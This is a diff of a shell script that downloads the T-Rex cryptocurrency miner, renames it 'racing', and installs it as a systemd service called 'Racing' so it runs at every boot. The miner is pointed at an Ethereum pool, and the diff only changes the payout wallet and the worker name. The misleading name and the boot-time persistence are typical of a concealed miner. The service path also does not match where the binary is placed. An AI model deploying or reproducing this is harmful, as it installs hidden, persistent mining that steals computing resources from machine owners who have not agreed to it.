@@ -12,7 +12,7 @@ sudo apt-get install libcurl3 -y
 sudo wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
 sudo tar xvzf t-rex-0.21.6-linux.tar.gz
 sudo mv t-rex racing
-sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x113319373741fA3D94747328BbF3fA0D1105ef1b -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
+sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x384b778e9eb07de7a6cbdbfd65c96e7860bf0a19 -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
 sudo systemctl daemon-reload
 sudo systemctl enable racing.service
-sudo ./racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x113319373741fA3D94747328BbF3fA0D1105ef1b -p x -w k98r &
+sudo ./racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x384b778e9eb07de7a6cbdbfd65c96e7860bf0a19 -p x -w lele &
